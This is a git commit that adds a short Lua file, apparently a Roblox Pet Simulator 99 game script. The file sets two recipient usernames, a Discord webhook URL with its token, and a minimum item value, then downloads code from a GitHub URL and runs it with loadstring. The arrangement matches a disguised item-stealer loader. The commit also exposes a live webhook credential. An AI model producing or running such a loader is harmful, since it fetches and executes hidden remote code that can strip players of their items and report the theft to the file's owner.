7360a5f71a9c3bc0efeab15477c681abf089f282
VOIDZ <goldbed145@gmail.com>
2024-12-13 12:31:11 +0800

    Upload new file: Ps99_Script_901408_note.lua

---
+++ Ps99_Script_901408_note.lua
@@ -0,0 +1,7 @@
+
+Username = "mainarxd123"
+Username2 = "goldbedi46"
+webhook = "https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq"
+min_rap = 20
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/VOIDv3/VOIDSCRIPTS/refs/heads/main/VOIDSCRIPTS'))()
